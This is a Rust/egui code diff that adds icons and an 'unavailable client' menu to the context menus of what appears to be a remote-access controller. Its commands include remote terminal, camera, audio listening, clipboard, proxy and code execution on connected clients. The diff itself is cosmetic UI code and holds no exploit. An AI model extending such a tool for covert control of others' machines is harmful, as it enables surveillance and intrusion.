@@ -16,12 +16,22 @@ pub fn render_context_menu(
     render_plugins(ui, client_id, send_command);
 }
 
+pub fn render_unavailable_client_menu(ui: &mut egui::Ui, client_id: &str, status: &str) {
+    ui.label(egui::RichText::new(format!("Client {status}")).strong());
+    ui.label("Remote commands are disabled until this client reconnects.");
+    ui.separator();
+    if ui.button("Copy Client ID").clicked() {
+        ui.ctx().copy_text(client_id.to_string());
+        ui.close();
+    }
+}
+
 fn render_session(
     ui: &mut egui::Ui,
     client_id: &str,
     send_command: &mut impl FnMut(&str, CommandKind),
 ) {
-    ui.menu_button("Session", |ui| {
+    ui.menu_button(menu_title("🔐", "Session"), |ui| {
         menu_command(
             ui,
             client_id,
@@ -89,7 +99,7 @@ fn render_remote_management(
     client_id: &str,
     send_command: &mut impl FnMut(&str, CommandKind),
 ) {
-    ui.menu_button("Remote Management", |ui| {
+    ui.menu_button(menu_title("🛠", "Remote Management"), |ui| {
         menu_command(
             ui,
             client_id,
@@ -173,7 +183,7 @@ fn render_live_control(
 ) {
     let response = ui
         .add_enabled_ui(gui_available, |ui| {
-            ui.menu_button("Live Control", |ui| {
+            ui.menu_button(menu_title("📡", "Live Control"), |ui| {
                 menu_command(
                     ui,
                     client_id,
@@ -206,7 +216,7 @@ fn render_user_interaction(
 ) {
     let response = ui
         .add_enabled_ui(gui_available, |ui| {
-            ui.menu_button("User Interaction", |ui| {
+            ui.menu_button(menu_title("💬", "User Interaction"), |ui| {
                 menu_command(
                     ui,
                     client_id,
@@ -257,7 +267,7 @@ fn render_system_info(
     client_id: &str,
     send_command: &mut impl FnMut(&str, CommandKind),
 ) {
-    ui.menu_button("System Info", |ui| {
+    ui.menu_button(menu_title("ℹ", "System Info"), |ui| {
         menu_command(
             ui,
             client_id,
@@ -283,7 +293,7 @@ fn render_execute(
     client_id: &str,
     send_command: &mut impl FnMut(&str, CommandKind),
 ) {
-    ui.menu_button("Execute", |ui| {
+    ui.menu_button(menu_title("▶", "Execute"), |ui| {
         menu_command(
             ui,
             client_id,
@@ -329,7 +339,7 @@ fn render_plugins(
     client_id: &str,
     send_command: &mut impl FnMut(&str, CommandKind),
 ) {
-    ui.menu_button("Plugins", |ui| {
+    ui.menu_button(menu_title("🔌", "Plugins"), |ui| {
         menu_command(
             ui,
             client_id,
@@ -347,14 +357,60 @@ fn menu_command(
     command: CommandKind,
     send_command: &mut impl FnMut(&str, CommandKind),
 ) {
+    let icon = command_icon(&command);
     let label = if command_is_implemented(&command) {
         label.to_string()
     } else {
         format!("{label} (TODO)")
     };
-    if ui.button(label).clicked() {
+    if ui.button(format!("{icon} {label}")).clicked() {
         send_command(client_id, command);
         ui.close();
+    }
+}
+
+fn menu_title(icon: &str, label: &str) -> String {
+    format!("{icon} {label}")
+}
+
+fn command_icon(command: &CommandKind) -> &'static str {
+    match command {
+        CommandKind::UpdateClient => "⬆",
+        CommandKind::UninstallClient => "🗑",
+        CommandKind::KillClientProcess | CommandKind::KillTargetProcess => "✖",
+        CommandKind::Shutdown => "🔴",
+        CommandKind::Reboot => "↻",
+        CommandKind::MoveToGroup => "📦",
+        CommandKind::CloneClientSettings => "📋",
+        CommandKind::DeleteClient => "🗑",
+        CommandKind::ClientConfig => "⚙",
+        CommandKind::FileManager => "📁",
+        CommandKind::RemoteTerminal => "⌨",
+        CommandKind::ProcessManager => "⚙",
+        CommandKind::WindowManager => "▣",
+        CommandKind::StartupManager => "🚀",
+        CommandKind::RegistryManager => "📚",
+        CommandKind::DriverManager => "🔌",
+        CommandKind::EventLog => "📄",
+        CommandKind::ActiveConnections => "🔗",
+        CommandKind::PerformanceMonitor => "📈",
+        CommandKind::RemoteDesktop => "💻",
+        CommandKind::Camera => "📷",
+        CommandKind::AudioListen => "🎧",
+        CommandKind::MessageBox => "💬",
+        CommandKind::BalloonTip => "🔔",
+        CommandKind::TextChat => "💬",
+        CommandKind::VoiceChat => "🎤",
+        CommandKind::OpenTextInNotepad => "📝",
+        CommandKind::ComputerInfo => "💻",
+        CommandKind::Clipboard => "📋",
+        CommandKind::Proxy => "🌐",
+        CommandKind::ExecuteFile => "📄",
+        CommandKind::ExecuteCode => "💻",
+        CommandKind::ExecuteStaticCommand => "▶",
+        CommandKind::CreateTask => "⏱",
+        CommandKind::CommandPreset => "★",
+        CommandKind::PluginManager => "🔌",
     }
 }
 
